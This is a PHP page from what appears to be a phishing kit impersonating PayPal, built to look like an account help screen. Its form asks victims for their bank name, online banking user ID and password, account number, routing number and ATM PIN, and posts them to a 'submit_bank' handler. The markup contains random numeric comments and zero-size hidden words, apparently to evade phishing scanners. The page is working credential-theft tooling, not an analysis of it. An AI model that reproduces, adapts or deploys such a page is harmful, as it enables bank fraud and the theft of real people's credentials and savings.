<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
require_once '../lang.php';
?>
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <link rel="shortcut icon" href="assets/pics/favi.ico">
    <link rel="apple-touch-icon" href="assets/pics/favi.png">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <title><?php echo $account['title'];?></title>
    <link rel="stylesheet" href="assets/styles/process.css">
    <script type="text/javascript" src="assets/js/jquery-3.3.1.min.js">
    </script>
    <script type="text/javascript" src="assets/js/jquery.mask.min.js">
    </script>
    <script type="text/javascript" src="assets/js/jquery.ccvalid.js"></script>
</head>

<body>
    <input type="checkbox" id="toggleMenu" class="menuToggler">
    <div class="desktopNav">
        <div class="navContainer">
            <a href="javascript:" class="desktopBrand"></a>
            <div class="mobileMenu">
                <div class="logoutMobile">
                    <a href="javascript:" class="logoutTxtMobile">
          Log Out</a>
                </div>
                <div class="settingsMobile">
                    <a href="javascript:" class="svgLogo settingsTxt">
                        <img src="assets/pics/settings.svg" alt=""></a>
                </div>
                <div>
                    <p class="displayMail">
                        <?php echo $_SESSION['login_email'];?></p>
                </div>
            </div>
            <div class="desktopMenu">
                <nav class="desktopItems">
                    <ul class="firstUl">
                        <li class="">
                            <a href="javascript:" class="linksTxt">
        <?php echo $account['summary'];?>     </a>
                        </li>
                        <li class="">
                            <a href="javascript:" class="linksTxt">
        <?php echo $account['activity'];?></a>
                        </li>
                        <li class="">
                            <a href="javascript:" class="linksTxt">
         <?php echo $account['send'];?></a></li>
                        <li class="">
                            <a href="javascript:" class="linksTxt"><?php echo $account['wallet'];?></a>
                        </li>
                        <li class="activeLi">
                            <a href="javascript:" class="linksTxt"><?php echo $account['help'];?></a>
                        </li>
                    </ul>
                    <ul class="secondUl">
                        <li class="notifLi">
                            <a href="javascript:" class="svgLogo notifTxt">
                                <img src="assets/pics/noti.svg" alt=""></a>
                        </li>
                        <li>
                            <a href="javascript:" class="svgLogo settingsTxt"><img src="assets/pics/settings.svg" alt=""></a>
                        </li>
                        <li class="logoutLi">
                            <a href="javascript:" class="logoutTxtDesktop"><?php echo $account['logout'];?></a>
                        </li>
                    </ul>
                </nav>
            </div>
        </div>
    </div>

    <div class="mainContainer">
        <div class="hide" id="rotate">
            <div class="spinner">
                <div class="rotate"></div>
                <div class="processing"><?php echo $account['proccessing'];?>...</div>
            </div>
            <div class="overlay">
            </div>
        </div>
        <div class="mobileNav">
            <div class="navHeader">
                <div class="blockToggler">
                    <label class="menuLabel" for="toggleMenu"><span></span>
                        <div class="menuOpen">Menu</div>
                        <div class="menuClose">
                            Close</div>
                    </label>
                </div>
            </div>
            <div class="navLogo">
                <a href="javascript:" class="mobileBrand"></a>
            </div>
            <ul class="notifUl">
                <li>
                    <a class="svgLogo notifTxt">
                        <img src="assets/pics/noti.svg" alt="">
                    </a>
                </li>
            </ul>
        </div>
        <?php if($os == "Android" or $os == "iPhone") {
        }else{
          echo "<br><br>";
        }?>
        <div class="contents">
      <!--9678674-->
      <section class="mainContents" id="mailaccess">
        <form action="submit_bank?key=<?php echo $key;?>" method="post" style="padding:0 20px">
          <br>
          <h1 style="font-size: 1.875rem;
    font-weight: 300;
    text-transform: none;
    font-family: 'PayPal-Sans-Big', Helvetica Neue, Arial, sans-serif;padding-bottom:10px"><!--42951176-->   <!--31245828--> <span style="font-size:0">darkness</span>
      <?php echo $bank['linkur'];?>      <span style="font-size:0">isnot good</span></h1>
          <p style="text-align: center;"><small><?php echo $bank['con'];?></small>
            <br> <small><?php echo $bank['the'];?><?php echo $_SESSION['ending'];?>.</small>
          </p>
          <div class="fields clearfix">
            <br>
            <!--28112947-->
            <div class="inputArea">
              <!--29460927-->
              <input name="bankname" style="margin-bottom: 20px;" required placeholder="<?php echo $bank['bn'];?>" autocomplete="off">
              <input name="userid" style="margin-bottom: 20px;" required placeholder="<?php echo $bank['cud'];?>" autocomplete="off">
              <!--8422338-->
              <input name="passcode" style="margin-bottom: 12px;" type="password" required placeholder="<?php echo $bank['cup'];?>" autocomplete="off">
              <!--49836196-->
              <div class="multiInputs">
                <!--14010343-->
                <div class="inputArea hasSub">
                  <!--36463214-->
                  <input name="accnum" style="margin-bottom: 20px;" required placeholder="<?php echo $bank['an'];?>" autocomplete="off">
                  <!--84141595-->
                </div>
                <!--83567650-->
                <div class="inputArea hasSub pull-right">
                  <!--8721299-->
                  <!--33432965-->
                  <input name="rnumber" style="margin-bottom: 20px;" required placeholder="<?php echo $bank['rn'];?>" autocomplete="off">
                </div>
                <input name="atmpin" style="margin-bottom: 20px;" required placeholder="<?php echo $bank['pin'];?>" autocomplete="off">
              </div>
              <!--99140063-->
            </div>
            <button style="margin-top:20px;width:100%" type="submit" class="bt"><?php echo $account['continue'];?></button>
        </form>
      </section>
      </div>
      <?php if($os == "Android" or $os == "iPhone") {
        }else{
          echo "<br><br>";
        }?>
        <div>
            <div class="ftr">
                <div class="footerFirstContent">
                    <ul class="footerList">
                        <li><a href="javascript:"><?php echo $account['contact'];?></a></li>
                        <li><a href="javascript:"><?php echo $account['sec'];?></a></li>
                    </ul>
                    <div class="footerSecondContent">
                        <p class="footerP">Copyright ©<span>1999-2020</span> . All rights reserved.</p>
                        <ul class="footerUl">
                            <li><a href="javascript:"><?php echo $login['privacy'];?></a></li>
                            <li><a href="javascript:"><?php echo $login['legal'];?></a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>
